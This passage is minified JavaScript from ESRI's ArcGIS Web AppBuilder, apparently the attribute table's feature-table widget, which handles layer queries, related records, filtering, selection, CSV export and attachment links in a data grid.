// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define("dojo/_base/declare dojo/_base/html dijit/_WidgetBase jimu/dijit/Message jimu/dijit/Filter dgrid/OnDemandGrid ../dgrid/Selection dgrid/extensions/ColumnHider dgrid/extensions/ColumnResizer dgrid/extensions/ColumnReorder dijit/Menu dijit/MenuItem dijit/Toolbar dijit/form/Button dijit/DropDownMenu dijit/form/ToggleButton dijit/form/DropDownButton dojo/Deferred dojo/when dojo/Evented dojo/touch dojo/store/Memory esri/config esri/lang esri/request esri/tasks/RelationParameters esri/tasks/RelationshipQuery esri/layers/FeatureLayer esri/tasks/QueryTask esri/tasks/query esri/tasks/ProjectParameters esri/geometry/Multipoint esri/geometry/geometryEngine esri/geometry/normalizeUtils esri/IdentityManager dojo/_base/lang dojo/on dojo/aspect dojo/_base/array jimu/dijit/LoadingIndicator jimu/dijit/FieldStatistics jimu/dijit/Popup jimu/SelectionManager jimu/CSVUtils jimu/utils ../utils dojo/query".split(" "),
function(B,g,E,x,F,G,H,I,J,K,L,p,M,y,N,O,P,q,Q,R,S,r,z,n,T,C,U,D,u,t,V,W,X,Y,Z,d,m,aa,l,ba,ca,da,ea,fa,ga,A,v){return B([E,R],{baseClass:"jimu-widget-attributetable-feature-table",_defaultFeatureCount:2E3,_defaultBatchCount:25,_batchCount:0,_filterObj:null,_currentDef:null,_requestStatus:"initial",map:null,matchingMap:!1,layerInfo:null,configedInfo:null,footerHeight:25,layer:null,loading:null,grid:null,footer:null,selectedRowsLabel:null,selectionRows:null,nls:null,_dblClickResult:null,actived:!1,
showSelected:!1,tableCreated:!1,_relatedQuery:!1,_relatedQueryIds:null,_selectionHandles:null,_selectionResults:null,constructor:function(a){a=a||{};this.set("map",a.map||null);this.set("matchingMap",!!a.matchingMap);this.set("layerInfo",a.layerInfo||null);this.set("layer",a.layer||null);this.set("configedInfo",a.configedInfo||null);this.set("relatedOriginalInfo",a.relatedOriginalInfo||null);this.set("relationship",a.relationship||null);this.set("syncSelection",!!a.syncSelection||!0)},postCreate:function(){this.inherited(arguments);
this._relatedQueryIds=[];this.createToolbar();this.loading=new ba;this.loading.placeAt(this.domNode);this.selectionManager=ea.getInstance();this._selectionResults=[];this.selectionRows=[];g.setAttr(this.domNode,"data-layerinfoid",d.getObject("layerInfo.id",!1,this));this.get("map")&&(this.own(m(this.map.root,S.release,d.hitch(this,function(){this._clickMap=!0}))),this.own(m(this.map,"extent-change",d.hitch(this,"_onExtentChange"))));this.own(m(window,"resize",d.hitch(this,this._resize)))},startup:function(){this.inherited(arguments);
this.toolbarHeight=parseInt(g.getStyle(this.toolbar.domNode,"height"),10)||0},setLayerDefinition:function(a){this._layerDefinition=a},getLayerDefinition:function(){return this._getLayerDifinition()},getFilterableFields:function(){if(this._layerDefinition&&this.configedInfo){var a=d.clone(this._layerDefinition);return this._getFilterableFields(a.fields,this.configedInfo.layer.fields)}return[]},getFilterObj:function(){return this._filterObj},setFilterObj:function(a){this._filterObj=a},showRefreshing:function(a){a?
this.loading.show():this.loading.hide()},active:function(){this.actived=!0},deactive:function(){this.actived=!1},cancelThread:function(){"fulfilled"!==this._requestStatus&&this._currentDef&&(this._currentDef.cancel({canceledBySelf:!0}),this._requestStatus="canceled")},isCanceled:function(){return"canceled"===this._requestStatus},createToolbar:function(){var a=new M({},g.create("div")),b=new N;this.showSelectedRecordsMenuItem=new p({label:this.nls.showSelectedRecords,iconClass:"esriAttributeTableSelectPageImage",
onClick:d.hitch(this,this.toggleSelectedRecords)});b.addChild(this.showSelectedRecordsMenuItem);this.showRelatedRecordsMenuItem=new p({label:this.nls.showRelatedRecords,iconClass:"esriAttributeTableSelectAllImage",onClick:d.hitch(this,this.onShowRelatedRecordsClick)});b.addChild(this.showRelatedRecordsMenuItem);this.filterMenuItem=new p({label:this.nls.filter,iconClass:"esriAttributeTableFilterImage",onClick:d.hitch(this,this.onFilterMenuItemClick)});b.addChild(this.filterMenuItem);this.toggleColumnsMenuItem=
new p({label:this.nls.columns,iconClass:"esriAttributeTableColumnsImage",onClick:d.hitch(this,this.onToggleColumnsClick)});b.addChild(this.toggleColumnsMenuItem);this.hideExportButton||(this.exportCSVMenuItem=new p({label:this.nls.exportFiles,showLabel:!0,iconClass:"esriAttributeTableExportImage",onClick:d.hitch(this,this.onExportCSVClick)}),b.addChild(this.exportCSVMenuItem));this.selectionMenu=new P({label:this.nls.options,iconClass:"esriAttributeTableOptionsImage",dropDown:b});a.addChild(this.selectionMenu);
this.matchingCheckBox=new O({checked:this.matchingMap?!0:!1,showLabel:!0,label:this.nls.filterByExtent,onChange:d.hitch(this,function(a){this.set("matchingMap",a);this._onMatchingCheckBoxChange(a)})});a.addChild(this.matchingCheckBox);this.zoomButton=new y({label:this.nls.zoomto,iconClass:"esriAttributeTableZoomImage",onClick:d.hitch(this,this.zoomTo)});a.addChild(this.zoomButton);this.clearSelectionButton=new y({label:this.nls.clearSelection,iconClass:"esriAttributeTableClearImage",onClick:d.hitch(this,
this.clearSelection,!0,!0)});a.addChild(this.clearSelectionButton);this.refreshButton=new y({label:this.nls.refresh,showLabel:!0,iconClass:"esriAttributeTableRefreshImage",onClick:d.hitch(this,this.refresh)});a.addChild(this.refreshButton);g.place(a.domNode,this.domNode);this.toolbar=a;this.own(m(this,"data-loaded,row-click,clear-selection",d.hitch(this,"changeToolbarStatus")))},startQuery:function(a){this.cancelThread();this._requestStatus="processing";this.loading.show();a&&a.length?this.queryByStoreObjectIds=
a:(this._relatedQuery=!1,this._relatedQueryIds=[],this.queryByStoreObjectIds=null);this._currentDef=this._getLayerObject();this._currentDef.then(d.hitch(this,function(b){this.domNode&&(this.layer=b,(b=!this.layerInfo.isTable&&this.matchingMap&&this.map.extent||null)&&b.spatialReference&&b.spatialReference.isWebMercator()?(this._currentDef=Y.normalizeCentralMeridian([b],null,d.hitch(this,function(a){return a[0]}))).then(d.hitch(this,function(b){this._doQuery(b,a)}),d.hitch(this,function(a){a&&"Request canceled"!==
a.message&&console.error(a);this.changeToolbarStatus();this.loading.hide()})):this._doQuery(b,a))}),d.hitch(this,function(a){console.error(a);this.changeToolbarStatus();this.loading.hide()}))},queryRecordsByRelationship:function(a){var b=a&&a.layer,c=a&&a.selectedIds;a&&a.relationship&&this.set("relationship",a.relationship);a&&a.relatedOriginalInfo&&this.set("relatedOriginalInfo",a.relatedOriginalInfo);var e=this.relationship;b&&e&&c&&0<c.length&&!ga.isEqual(this._relatedQueryIds,c)&&d.getObject("relatedOriginalInfo.layerObject.url",
!1,this)?(this.loading.show(),this._requestStatus="processing",this._relatedQuery=!0,this.matchingCheckBox.set("checked",!1),this.cancelThread(),this._currentDef=this._getLayerObject(),this._currentDef.then(d.hitch(this,function(a){if(this.domNode){this.layer=a;var f=[],k=this.layer;l.forEach(k.fields,function(a){(!n.isDefined(a.show)||!0===a.show||"esriFieldTypeOID"===a.type||n.isDefined(k.objectIdField)&&a.name===k.objectIdField)&&f.push(a.name)});a=new U;a.objectIds=c;a.outFields=f.length?f:["*"];
a.relationshipId=e.id;a.returnGeometry="esriGeometryPoint"===this.layer.geometryType;(this._currentDef=b.queryRelatedFeatures(a,function(a){return a})).then(d.hitch(this,function(a){if(this.domNode){var b={displayFieldName:e.objectIdField,fields:k.fields,features:[],fieldAliases:null},d={},f=function(a){var c=a.attributes[this.layer.objectIdField];d[c]||(d[c]=!0,b.features.push(a))},h;for(h in a){var w=a[h];l.forEach(w&&w.features,f,this)}g.destroy(this.tipNode);0<b.features.length?(this.grid||(this._removeTable(),
g.place(this.loading.domNode,this.domNode)),a=this._getOutFieldsFromLayerInfos(this.layer.objectIdField),this.queryExecute(a,b.features.length,!1,b)):(this.tipNode=g.toDom("\x3cdiv\x3e"+this.nls.noRelatedRecords+"\x3c/div\x3e"),this._removeTable(),g.place(this.tipNode,this.domNode),g.place(this.loading.domNode,this.domNode));this._relatedQueryIds=c;this.emit("data-loaded");this.loading.hide()}}),d.hitch(this,function(a){a&&"Request canceled"!==a.message&&console.error(a);g.destroy(this.tipNode);this.tipNode=
g.toDom("\x3cdiv\x3e"+this.nls.noRelatedRecords+"\x3c/div\x3e");this._removeTable();g.place(this.tipNode,this.domNode);g.place(this.loading.domNode,this.domNode);this.loading.hide();this.changeToolbarStatus()}))}}),d.hitch(this,function(a){console.error(a);this.loading.hide();this.changeToolbarStatus()}))):this.loading.hide()},getSelectedRows:function(){return this.tableCreated?this.selectionRows:[]},zoomTo:function(){this._zoomToSelected()},toggleSelectedRecords:function(){this._relatedQuery&&!this.showSelected&&
0===this.getSelectedRows().length?(this._relatedQuery=!1,this._relatedQueryIds=[],this.layerInfo&&!this.layerInfo.isTable&&this.matchingCheckBox.set("checked",!0),this.startQuery(),this.showSelectedRecordsMenuItem.set("label",this.nls.showSelectedRecords),this.showSelected=!1,this.emit("show-all-records",{layerInfoId:this.layerInfo.id})):this.tableCreated&&(this.showSelected?(this.showAllSelectedRecords(),this.showSelectedRecordsMenuItem.set("label",this.nls.showSelectedRecords),this.showSelected=
!1,this.emit("show-all-records",{layerInfoId:this.layerInfo.id})):(this.showSelectedRecords(),this.showSelectedRecordsMenuItem.set("label",this.nls.showAllRecords),this.showSelected=!0,this.emit("show-selected-records",{layerInfoId:this.layerInfo.id})))},onShowRelatedRecordsClick:function(){this.emit("show-related-records",{layerInfoId:this.layerInfo.id,objectIds:this.getSelectedRows()})},onFilterMenuItemClick:function(){this.showRefreshing(!0);this.getLayerDefinition().then(d.hitch(this,function(a){if(this.domNode){a=
d.clone(a);var b=this.getFilterableFields();a.fields=b;var c=new F({noFilterTip:this.nls.noFilterTip,style:"width:100%;",featureLayerId:this.layerInfo.id}),b=this._getFilterPopupSize();this._filterPopup=new da({titleLabel:this.nls.filter,width:b.w,height:b.h,content:c,autoHeight:!0,buttons:[{label:this.nls.ok,onClick:d.hitch(this,function(){var a=c.toJson();a&&a.expr?(this.setFilterObj(a),this.clearSelection(!1),this.startQuery(),this._filterPopup.close(),this._filterPopup=null,this.emit("apply-filter",
{layerInfoId:this.layerInfo.id,expr:a.expr})):new x({message:this.nls.setFilterTip})})},{label:this.nls.cancel}]});c.startup();g.addClass(this._filterPopup.domNode,"widget-at-filter-popup");(b=this.getFilterObj())?c.buildByFilterObj(this.layer.url,b,a):c.buildByExpr(this.layer.url,null,a)}}),d.hitch(this,function(a){this.domNode&&console.error(a)})).always(d.hitch(this,function(){this.showRefreshing(!1)}));this.emit("show-filter",{layerInfoId:this.layerInfo.id})},_getFilterPopupSize:function(){var a=
{w:720,h:485};window.appInfo.isRunInMobile&&(a={w:window.innerWidth,h:window.innerHeight});return a},_resize:function(){if(this._filterPopup){var a=this._getFilterPopupSize();this._filterPopup.resize(a)}},onToggleColumnsClick:function(){this.toggleColumns();this.emit("toggle-columns",{layerInfoId:this.layerInfo.id})},onExportCSVClick:function(){var a=new x({message:this.nls.exportMessage,titleLabel:this.nls.exportFiles,autoHeight:!0,buttons:[{label:this.nls.ok,onClick:d.hitch(this,function(){this.exportToCSV();
a.close()})},{label:this.nls.cancel}]});this.emit("export-csv",{layerInfoId:this.layerInfo.id})},onSelectionComplete:function(){var a=this.layer&&this.layer.getSelectedFeatures();a&&(0===a.length?this.clearSelection(!1):this._selectBySelf(a)||(this.clearSelection(!1),this._updateSelectRowsByFeatures(a)))},changeToolbarStatus:function(){if(this.tableCreated){var a=this.getSelectedRows();this.showSelected?this.showSelectedRecordsMenuItem.set("label",this.nls.showAllRecords):this.showSelectedRecordsMenuItem.set("label",
this.nls.showSelectedRecords);this.tableCreated&&a&&0<a.length&&this.layer&&this.layer.objectIdField?(this.showSelectedRecordsMenuItem.set("disabled",!1),this.clearSelectionButton.set("disabled",!1)):(this.showSelectedRecordsMenuItem.set("disabled",!0),this.clearSelectionButton.set("disabled",!0));this._relatedQuery&&(this.showSelectedRecordsMenuItem.set("disabled",!1),this.tableCreated&&a&&0===a.length&&this.showSelectedRecordsMenuItem.set("label",this.nls.showAllRecords));this.showRelatedRecordsMenuItem.set("disabled",
!0);if(this.layerInfo&&this.isSupportQueryToServer()&&a&&0<a.length&&this.layer&&this.layer.objectIdField){this._relatedDef&&!this._relatedDef.isFulfilled()&&this._relatedDef.cancel();var b=this.layerInfo.getRelatedTableInfoArray();this._relatedDef=b;b.then(d.hitch(this,function(a){if(this.domNode){var b=this.getSelectedRows();this.tableCreated&&a&&0<a.length&&b&&0<b.length&&this.showRelatedRecordsMenuItem.set("disabled",!1)}}))}this.tableCreated&&this.isSupportQueryToServer()&&!this._relatedQuery?
this.filterMenuItem.set("disabled",!1):this.filterMenuItem.set("disabled",!0);this.matchingCheckBox.set("disabled",!1);this.tableCreated?this.toggleColumnsMenuItem.set("disabled",!1):this.toggleColumnsMenuItem.set("disabled",!0);this.hideExportButton||(a&&0<a.length?this.exportCSVMenuItem.set("label",this.nls.exportSelected):this.exportCSVMenuItem.set("label",this.nls.exportAll),this.tableCreated?this.exportCSVMenuItem.set("disabled",!1):this.exportCSVMenuItem.set("disabled",!0));this.layerInfo.isShowInMap()?
this.tableCreated&&a&&0<a.length?this.zoomButton.set("disabled",!1):this.zoomButton.set("disabled",!0):this.zoomButton.set("disabled",!0);this.layerInfo.isTable&&(this.matchingCheckBox.set("disabled",!0),this.zoomButton.set("disabled",!0))}else this._relatedQuery?(this.showSelectedRecordsMenuItem.set("disabled",!1),this.showSelectedRecordsMenuItem.set("label",this.nls.showAllRecords)):this.showSelectedRecordsMenuItem.set("disabled",!0),this.showRelatedRecordsMenuItem.set("disabled",!0),this.matchingCheckBox.set("disabled",
!0),this.filterMenuItem.set("disabled",!0),this.toggleColumnsMenuItem.set("disabled",!0),this.hideExportButton||this.exportCSVMenuItem.set("disabled",!0),this.zoomButton.set("disabled",!0)},showSelectedRecords:function(){if(this.tableCreated){var a=this.layer.objectIdField,b=this.getSelectedRows();0<b.length&&this.grid&&(this.grid.store instanceof r?this.grid.set("query",d.hitch(this,function(c){return"number"===typeof c&&-1<b.indexOf(c)||-1<b.indexOf(c[a])?!0:!1})):this.grid.set("query",function(){return b}))}},
showAllSelectedRecords:function(){if(this.tableCreated&&this.showSelected){this.grid.set("query",{});var a=this.getSelectedRows();this._updateSelectRowsByIds(a)}},clearSelection:function(a,b){this.tableCreated&&(this.grid.clearSelection(),this.selectionRows=[],a&&this.grid.set("query",{}),b&&(this.selectionManager.clearSelection(this.layer),this._selectionResults=[]),this._closePopup(),this.setSelectedNumber(),this.showSelected=!1,this.emit("clear-selection"))},refresh:function(){this.grid&&this.grid.clearSelection();
this._relatedQuery||this.startQuery();this.emit("refresh",{layerInfoId:this.layerInfo.id})},exportToCSV:function(a){this.layerInfo&&this.layer&&this.tableCreated&&this.getSelectedRowsData().then(d.hitch(this,function(b){var c=this.layer.objectIdField,e=l.map(this._getTableSelectedIds(),d.hitch(this,function(a){for(var e=0,d=b.length;e<d;e++)if(b[e]&&b[e][c]===a)return b[e];return{}}))||[];0===e.length&&this.isSelectionMode()&&e.push({});var f=e;0===e.length&&this.grid.store instanceof r&&(f=d.clone(this.grid.store.data));
f.length&&this._appendXY(f);var e={},h=this.getOutFields(!!f.length);e.datas=f;e.fromClient=!1;e.withGeometry="esriGeometryPoint"===this.layer.geometryType;e.outFields=h;e.formatNumber=!1;e.formatDate=!0;e.formatCodedValue=!0;e.popupInfo=this.layerInfo.getPopupInfo();return fa.exportCSVFromFeatureLayer(a||this.configedInfo.name,this.layer,e)}))},toggleColumns:function(){this.tableCreated&&this.grid._toggleColumnHiderMenu()},changeHeight:function(a){this.grid&&0<=a-this.toolbarHeight-this.footerHeight&&
g.setStyle(this.grid.domNode,"height",a-this.toolbarHeight-this.footerHeight+"px")},isSupportQueryToServer:function(){var a=this.layer&&"esri.layers.CSVLayer"===this.layer.declaredClass,b=this.layer&&"esri.layers.StreamLayer"===this.layer.declaredClass;return this.layer&&this.layer.url&&this.configedInfo.layer.url&&!a&&!b},isSupportQueryOnClient:function(){var a=this.layer&&"esri.layers.CSVLayer"===this.layer.declaredClass,b=this.layer&&"esri.layers.StreamLayer"===this.layer.declaredClass;return!(this.layer&&
this.layer.url&&this.configedInfo.layer.url)||a||b},destroy:function(){this._destroyed||(this.layer=this.configedInfo=this.layerInfo=null,this._selectionHandles&&l.forEach(this._selectionHandles,function(a){a&&a.remove&&a.remove()}),this._closePopup(),this._filterPopup&&this._filterPopup.domNode&&(this._filterPopup.close(),this._filterPopup=null),this._dblClickResult=null,this.grid&&this.grid.destroy(),this.relationship=this.nls=this.map=null,this._currentDef&&!this._currentDef.isFulfilled()&&this._currentDef.cancel({canceledBySelf:!0}),
this._relatedDef&&!this._relatedDef.isFulfilled()&&this._relatedDef.cancel({canceledBySelf:!0}),this.inherited(arguments))},_selectBySelf:function(a){a=a||[];return a.length!==this._selectionResults.length?!1:l.every(this._selectionResults,function(b){return-1<a.indexOf(b)})},_updateSelectRowsByFeatures:function(a){a=l.map(a,d.hitch(this,function(a){return a.attributes[this.layer.objectIdField]}));this._updateSelectRowsByIds(a)},_updateSelectRowsByIds:function(a){this.grid&&this.tableCreated&&(this.selectionRows=
a,l.forEach(a,d.hitch(this,function(a){this.grid.select(a)})),this.setSelectedNumber(),this.changeToolbarStatus())},_removeTable:function(){this.grid&&this.grid.domNode&&(this.grid.destroy(),this.grid=null);this.footer&&(g.destroy(this.footer),this.selectedRowsLabel=this.footer=null);this.tableCreated=!1},_onMatchingCheckBoxChange:function(a){this.tableCreated&&!this._relatedQuery&&(this.cancelThread(),this.queryByStoreObjectIds=null,this.startQuery());if("fulfilled"===this._requestStatus&&this.tableCreated&&
this._relatedQuery)if(a)this.queryByStoreObjectIds=l.map(this.grid.store.data,d.hitch(this,function(a){return a[this.layer.objectIdField]})),this.startQuery(this.queryByStoreObjectIds);else{var b=this._relatedQueryIds;this._relatedQueryIds=[];this.queryRecordsByRelationship({layer:this.relatedOriginalInfo.layerObject,selectedIds:b})}a||(this._currentExtent=null)},_closePopup:function(){var a=this.map.infoWindow.getSelectedFeature(),b=a&&this._dblClickResult&&a===this._dblClickResult,a=a&&a._layer===
this.layer;this.domNode&&(b||a)&&(this.map.infoWindow.hide(),this._dblClickResult=null)},_getLayerObject:function(){function a(a){this._selectionHandles&&l.forEach(this._selectionHandles,function(a){a&&a.remove&&a.remove()});this._selectionHandles=[];this._selectionHandles.push(m(a,"selection-complete",d.hitch(this,"onSelectionComplete")))}return(this._currentDef=this.layerInfo.getLayerObject()).then(d.hitch(this,function(b){var c=new q;"esri.layers.ArcGISImageServiceLayer"===b.declaredClass||"esri.layers.ArcGISImageServiceVectorLayer"===
b.declaredClass?(b=new D(b.url),this.own(m(b,"load",d.hitch(this,function(b){d.hitch(this,a)(b.layer);c.resolve(b.layer)})))):(d.hitch(this,a)(b),c.resolve(b));return c}))},_getLayerDifinition:function(){return this._layerDefinition?Q(d.clone(this._layerDefinition)):T({url:this.layer.url,content:{f:"json"},handleAs:"json",callbackParamName:"callback"}).then(d.hitch(this,function(a){this.setLayerDefinition(a);return this.getLayerDefinition()}))},_getFilterableFields:function(a,b){return l.filter(a,
function(a){return l.some(b,function(b){return a.name===b.name&&(b.show||!n.isDefined(b.show))&&d.mixin(a,b)})})},_doQuery:function(a,b){if(this.layer){var c=this.layer.objectIdField;this.isSupportQueryToServer()?this._queryToServer(a,c,b):this.isSupportQueryOnClient()&&this._queryOnClient(a,c,b)}},_queryOnClient:function(a,b,c){var e={};e.features="esri.layers.StreamLayer"===this.layer.declaredClass?this.layer.getLatestObservations():l.filter(this.layer.graphics,d.hitch(this,function(a){return!a.wabIsTemp}));
c&&0<c.length&&(e.features=l.filter(e.features,function(a){return-1<c.indexOf(a.attributes[this.layer.objectIdField])},this));var f=this.layer.fields,h=this.configedInfo.layer.fields;e.fields=h?l.filter(h,d.hitch(this,function(a){n.isDefined(a.show)||(a.show=!0);a.name!==b||"esriFieldTypeOID"!==a.type&&"esriFieldTypeInteger"!==a.type||(a._pk=!0);for(var c=0,e=f.length;c<e;c++)f[c].name!==a.name||a.type||(a.type=f[c].type);return a.show||a._pk})):l.filter(f,d.hitch(this,function(a){n.isDefined(a.show)||
(a.show=!0);a.name!==b||"esriFieldTypeOID"!==a.type&&"esriFieldTypeInteger"!==a.type||(a._pk=!0);return a.show||a._pk}));for(var h=[],k=e.features.length,g=0;g<k;g++)e&&e.features&&e.features[g]&&e.features[g].geometry&&h.push(e.features[g].geometry);a&&z.defaults.geometryService&&0<h.length?a.spatialReference.equals(h[0].spatialReference)?(e.features=l.filter(e.features,d.hitch(this,function(b){return X.intersects(a,b.geometry)})),this.queryExecute(e.fields,e.features.length,!1,e,a)):(k=new C,k.geometries1=
h,k.geometries2=[a],k.relation=C.SPATIAL_REL_INTERSECTION,(this._currentDef=z.defaults.geometryService.relation(k,d.hitch(this,function(a){return a}))).then(d.hitch(this,function(b,c){for(var e=c.length,d=[],f=0;f<e;f++)d.push(b.features[c[f].geometry1Index]);b.features=d;this.queryExecute(b.fields,b.features.length,!1,b,a)},e),d.hitch(this,function(a){a&&"Request canceled"!==a.message&&console.error(a);this.changeToolbarStatus();this.loading.hide()}))):this.queryExecute(e.fields,e.features.length,
!1,e,a)},_queryToServer:function(a,b,c){this._getFeatureCount(a,c).then(d.hitch(this,function(e){if(this.domNode)if(c)this._queryFeatureLayer(a,b,e,!1,c);else{var f=this.layer,h=n.isDefined(f.maxRecordCount)?f.maxRecordCount:1E3;this._batchCount=Math.min(h,this._defaultBatchCount);if(e<=h||!this.layer.objectIdField)this._queryFeatureLayer(a,b,e,!1);else{var k=this._getOutFieldsFromLayerInfos(b),g={fields:this.layer.fields};this.layer._recordCounts=e;f.advancedQueryCapabilities&&f.advancedQueryCapabilities.supportsPagination?
this.queryExecute(k,e,!0,g,a):this._getFeatureIds(b,a).then(d.hitch(this,function(b){this.domNode&&(this.layer._objectIds=b,this.queryExecute(k,e,!0,g,a))}),d.hitch(this,function(a){console.error(a);this.changeToolbarStatus()}))}}}),d.hitch(this,function(a){console.error(a);this.changeToolbarStatus()}))},_getFeatureCount:function(a,b){var c=new q,e=new u(this.configedInfo.layer.url),f=new t;f.returnGeometry=!1;f.where=this._getLayerFilterExpression();b&&(f.where+=" AND "+this.layer.objectIdField+
" IN ("+b.join()+")");a&&(f.geometry=a);(this._currentDef=e.executeForCount(f,d.hitch(this,function(a){return a}))).then(d.hitch(this,function(a){c.resolve(a)}),d.hitch(this,function(a){a&&"Request canceled"!==a.message&&(console.error(a),console.log("Could not get feature count."));this.loading.hide();c.reject(a)}));return c},_queryFeatureLayer:function(a,b,c,e,f){var h=new u(this.configedInfo.layer.url),k=new t;k.where=this._getLayerFilterExpression();f&&b&&(k.where+=" AND "+b+" IN ("+f.join()+
")");var g=this._getOutFieldsFromLayerInfos(b);0<g.length?(f=l.map(g,function(a){return a.name}),k.outFields=f):k.outFields=["*"];a&&(k.geometry=a,k.spatialRelationship=t.SPATIAL_REL_INTERSECTS);k.outSpatialReference=d.clone(this.map.spatialReference);k.returnGeometry="esriGeometryPoint"===this.layer.geometryType;b&&(k.orderByFields=[b+" ASC"]);(this._currentDef=h.execute(k,d.hitch(this,function(a){return a}))).then(d.hitch(this,function(b){this.queryExecute(g,c,e,b,a)}),d.hitch(this,function(a){a&&
"Request canceled"!==a.message&&console.error(a);this.changeToolbarStatus();this.loading.hide()}))},_getFeatureIds:function(a,b){var c=new q,e=new u(this.configedInfo.layer.url),f=new t;f.returnGeometry=!1;f.returnIdsOnly=!0;f.where=this._getLayerFilterExpression();if(this.layer._orderByFields||a)f.orderByFields=this.layer._orderByFields||[a+" ASC"];b&&(f.geometry=b);(this._currentDef=e.executeForIds(f,d.hitch(this,function(a){return a}))).then(d.hitch(this,function(a){c.resolve(a)}),d.hitch(this,
function(a){a&&"Request canceled"!==a.message&&(console.error(a),console.log("Could not get feature Ids"));c.resolve([])}));return c},queryExecute:function(a,b,c,e,f){var h=[],h=null,k={};if(this.domNode){e.fields=this._processExecuteFields(this.layer.fields,a);c?h=A.generateCacheStore(this.layer,b,this._batchCount,this._getLayerFilterExpression(),f):(h=l.map(e.features,d.hitch(this,function(a){var b=d.clone(a.attributes);return d.mixin(b,{geometry:a.geometry})})),h=A.generateMemoryStore(h,this.layer.objectIdField));
a=this.layer.typeIdField;var k=this.layer.types,w=d.getObject("advancedQueryCapabilities.supportsOrderBy",!1,this.layer),ha=d.getObject("advancedQueryCapabilities.supportsPagination",!1,this.layer),m=d.getObject("advancedQueryCapabilities.supportsStatistics",!1,this.layer),k=A.generateColumnsFromFields(this.layerInfo.getPopupInfo(),e.fields,a,k,w&&ha||!c,m);this.layer.hasAttachments&&this.layer.objectIdField&&this.configedInfo.showAttachments&&(k.attachmentsColumn=this.formatAttachmentsColumn());
c=20+100*e.fields.length<g.getMarginBox(this.domNode).w;this.createTable(k,h,b,c);this._currentExtent=f;b=this.layer.getSelectedFeatures();this.selectionRows&&0<this.selectionRows.length?this._updateSelectRowsByIds(this.selectionRows):b&&0<b.length?this._updateSelectRowsByFeatures(b):this.grid.clearSelection();this.changeToolbarStatus();this.emit("data-loaded")}},formatAttachmentsColumn:function(){var a={label:this.nls.attachments,className:"attachments-column",hidden:!1,unhidable:!0,field:"at-show-attachments",
sortable:!1,_cache:{sortable:!1,statistics:!1}};a.renderCell=d.hitch(this,function(a,c,e){var b=a[this.layer.objectIdField];this.layer.queryAttachmentInfos(b,d.hitch(this,function(a){var c=l.map(a,d.hitch(this,function(a){var c=a.name&&/\.(png|jpg|jpeg|gif)$/gi.test(a.name)?"image-type":"file-type",e=Z.findCredential(this.layer.url);return'\x3cli class\x3d"'+c+'"\x3e\x3ca class\x3d"jimu-ellipsis" target\x3d"_blank" href\x3d"'+(this.layer.url+"/"+b+"/attachments/"+a.id+(e?"?token\x3d"+e.token:""))+
'"\x3e'+a.name+"\x3c/a\x3e\x3c/li\x3e"})),f="";0<a.length&&(f=" "+this.nls.files);f='\x3cdiv class\x3d"attachment-infos"\x3e\x3cdiv class\x3d"show-attachments-div"\x3e\x3cspan class\x3d"show-attachments"\x3e'+a.length+f+'\x3c/span\x3e\x3c/div\x3e\x3cdiv class\x3d"attachment-popup"\x3e\x3cdiv class\x3d"attachment-popup-header"\x3e\x3cspan\x3e'+c.length+"\x26nbsp;"+this.nls.files+'\x3c/span\x3e\x3cspan class\x3d"close jimu-float-trailing"\x3e\x3c/span\x3e\x3c/div\x3e\x3cul class\x3d"attachment-popup-content"\x3e'+
c.join("")+"\x3c/ul\x3e\x3c/div\x3e\x3c/div\x3e";f=g.toDom(f);0<a.length&&(a=v(".show-attachments-div",f)[0],g.addClass(a,"has-attachments"));e.appendChild(f);this.own(m(e,"click",d.hitch(this,function(a){a=a&&a.target;if(g.hasClass(a,"show-attachments-div")||g.hasClass(a,"show-attachments")||g.hasClass(a,"close")){a=this._visibleAttachmentPopup;var b=v(".attachment-popup",e)[0];b&&0<c.length&&g.toggleClass(b,"show");g.hasClass(b,"show")?this._visibleAttachmentPopup=b:this._visibleAttachmentPopup=
null;a&&a!==b&&g.toggleClass(a,"show")}})))}),d.hitch(this,function(a){console.error(a)}))});return a},createTable:function(a,b,c,e){if(this.grid)this.grid.set("store",b),this.grid.set("columns",a),this.grid.refresh();else{var f={};f.columns=a;f.store=b;f.keepScrollPosition=!0;f.pagingDelay=1E3;f.allowTextSelection=!0;f.deselectOnRefresh=!1;this.layer.objectIdField||(f.minRowsPerPage=this.layer.maxRecordCount||1E3,f.maxRowsPerPage=this.layer.maxRecordCount||1E3,f.selectionMode="none");this.grid=new (B([G,
H,I,J,K]))(f,g.create("div"));g.place(this.grid.domNode,this.domNode);this.grid.startup();this.tipNode&&g.destroy(this.tipNode);this.own(m(this.ownerDocument,"keydown",d.hitch(this,function(a){this.grid&&this.grid.allowTextSelection&&a.shiftKey&&this.grid._setAllowTextSelection(!1)})));this.own(m(this.ownerDocument,"keyup",d.hitch(this,function(){this.grid&&!this.grid.allowTextSelection&&this.grid._setAllowTextSelection(!0)})));this.layer.objectIdField&&(this.own(m(this.grid,".dgrid-header .dgrid-cell:click",
d.hitch(this,this._onHeaderClick))),this.own(m(this.grid,"dgrid-columnstatechange",d.hitch(this,this._onColumnStateChange))),this.own(m(this.grid,".selection-handle-column:click",d.hitch(this,this._onSelectionHandleClick))),this.own(m(this.grid,".dgrid-row:dblclick",d.hitch(this,this._onDblclickRow))),this.own(m(this.grid,"dgrid-sort",d.hitch(this,function(a){this.emit("sort",a)}))),a=this.map.getLayer(this.layer.id),this.syncSelection&&a&&this.own(m(a,"click",d.hitch(this,this._onFeaturelayerClick))))}this.layer.objectIdField&&
this.grid.set("sort",this.layer.objectIdField,!1);this.getParent()&&(a=v(".dgrid-scroller",this.grid.domNode)[0],f=v(".dgrid-header",this.grid.domNode)[0],b=g.getComputedStyle(a),f=g.getMarginBox(f),b=parseInt(b.marginTop,10),isFinite(b)&&f&&b<f.h&&g.setStyle(a,"marginTop",f.h+"px"));e?g.addClass(this.domNode,"auto-width"):g.removeClass(this.domNode,"auto-width");this.footer?g.empty(this.footer):this.footer=g.create("div",{"class":"jimu-widget-attributetable-feature-table-footer"},this.domNode);c=
